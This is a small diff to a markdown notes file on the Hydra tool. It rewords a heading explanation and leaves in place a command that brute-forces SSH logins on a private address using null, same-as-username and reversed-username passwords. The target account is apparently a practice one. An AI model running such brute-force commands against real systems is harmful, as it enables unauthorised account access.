@@ -8,7 +8,7 @@ sudo dnf install hydra
 
 #### bruteforce trivial ssh passwords
 
-This worked:
+bruteforce passwords that are the same or the reverse of the login name, or null:
 ```
 hydra -l breakme -e nsr 192.168.2.172 ssh
 ```
